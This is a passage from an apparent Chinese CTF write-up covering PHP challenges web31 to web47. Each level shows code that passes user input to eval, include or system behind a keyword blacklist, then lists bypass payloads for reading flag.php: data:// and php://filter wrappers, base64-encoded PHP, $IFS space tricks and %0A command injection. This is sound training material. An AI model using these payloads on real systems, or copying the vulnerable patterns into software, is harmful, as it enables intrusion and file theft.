highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了flag、system、php、cat、sort、shell关键字还有<code>.</code>和空格<br>套eval通杀<code>?c=eval($_GET[1]);&amp;1=system(&#39;cat f*&#39;);</code><br>passthru：<code>?c=passthru(&quot;tac\$IFS\$6f*&quot;);</code> <code>$IFS$6</code>、<code>$&#123;IFS&#125;</code>、<code>%09</code>绕空格，$需要转义<br>反引号也行：<code>print_r(</code>nl%09f*<code>);</code><br>高级操作：<br>1.文件包含加伪协议：<br><code>?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br>2：<br><code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));  </code><br> <code>localeconv</code>可以返回包括小数点在内的一个数组；<code>pos</code>去取出数组中当前第一个元素，也就是小数点。 <code>scandir</code>可以结合它扫描当前目录内容。 <code>?c=print_r(scandir(pos(localeconv()))); </code>可以看到当前目录下有<code>flag.php </code>通过<code>array_reverse</code>把数组逆序，通过<code>next</code>取到第二个数组元素，也即flag.php 然后<code>show_source</code>直接高亮<code>flag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [decimal_point] =&gt; .</span><br><span class="hljs-comment">    [thousands_sep] =&gt; </span><br><span class="hljs-comment">    [int_curr_symbol] =&gt; </span><br><span class="hljs-comment">    [currency_symbol] =&gt; </span><br><span class="hljs-comment">    [mon_decimal_point] =&gt; </span><br><span class="hljs-comment">    [mon_thousands_sep] =&gt; </span><br><span class="hljs-comment">    [positive_sign] =&gt; </span><br><span class="hljs-comment">    [negative_sign] =&gt; </span><br><span class="hljs-comment">    [int_frac_digits] =&gt; 127</span><br><span class="hljs-comment">    [frac_digits] =&gt; 127</span><br><span class="hljs-comment">    [p_cs_precedes] =&gt; 127</span><br><span class="hljs-comment">    [p_sep_by_space] =&gt; 127</span><br><span class="hljs-comment">    [n_cs_precedes] =&gt; 127</span><br><span class="hljs-comment">    [n_sep_by_space] =&gt; 127</span><br><span class="hljs-comment">    [p_sign_posn] =&gt; 127</span><br><span class="hljs-comment">    [n_sign_posn] =&gt; 127</span><br><span class="hljs-comment">    [grouping] =&gt; Array</span><br><span class="hljs-comment">        (</span><br><span class="hljs-comment">        )</span><br><span class="hljs-comment">    [mon_grouping] =&gt; Array</span><br><span class="hljs-comment">        (</span><br><span class="hljs-comment">        )</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//.</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))); <span class="hljs-comment">//print_r(scandir(&#x27;.&#x27;));</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了单引号、反引号、 echo ，； 和（<br><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?&gt;</code>闭合前面的语句，代替<code>;</code> include可以不用括号</p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了单引号，反引号，;和(<br><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了<code>&lt;</code><br><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了数字<br><code>?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了flag，想到base64<br><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code><br><code>**?c=data://text/plain,&lt;?php system(&#39;tac f*&#39;);?&gt;**</code></p><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code><br>过滤php用短标签<br><code>?c=data://text/plain,&lt;?= system(&#39;tac f*&#39;);?&gt;</code></p><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code><br><code>?c=data://text/plain,&lt;?= system(&#39;tac f*&#39;);?&gt;</code><br>语句已经闭合，.php无影响</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>注意到过滤的是中文的括号<br><code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));  </code><br><code>?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p><code>?c=show_source(next(array_reverse(scandir(getcwd())))); </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;pwd&#x27;</span>)==<span class="hljs-title function_ invoke__">getcwd</span>());<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//bool(true)</span><br></code></pre></td></tr></table></figure><p><code>getcwd()</code>获取当前目录</p><p><code>?c=eval(next(reset(get_defined_vars())));&amp;cmd=;system(&quot;tac flag.php&quot;);</code><br> get_defined_vars() 返回一个包含所有已定义变量的多维数组  ，该数组包含get和post<br><code>reset</code>指针重置到数组中的第一个元素<br><code>next() </code>函数将内部指针指向数组中的下一个元素，并输出。</p><p><code>?c=eval(array_pop(next(get_defined_vars()))); </code>post<br> <code>array_pop()</code> 函数删除数组中的最后一个元素并返回其值。  </p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code> 这条命令的意思是将标准输出和错误输出全部重定向到/dev/null中,也就是将产生的所有信息丢弃<br><code>?c=tac flag.php;</code>用分号将命令截断<br><code>?c=cat flag.php%0A</code> 换行符</p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了分号和cat<br><code>?c=tac flag.php%0A</code><br><code>?c=nl flag.php%0A</code><br><code>?c=less flag.php||</code>  逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行</p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=tac fl?g.php%0A</code><br><code>?c=tac f*.php%0A</code><br>通配符即可</p><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤空格<br><code>$IFS$6</code> <code>$&#123;IFS&#125;``%09``$IFS``&lt;</code><br><code>?c=tac$IFS$6f*.php%0A</code><br><code>echo$IFS</code>tac$IFS*<code>%0A</code></p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤空格<br><code>$IFS$6</code> <code>$&#123;IFS&#125;``%09``$IFS``&lt;</code><br><code>nl&lt;fla&#39;&#39;g.php||</code><br><code>tac&lt;fla&#39;&#39;g.php||</code></p><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span 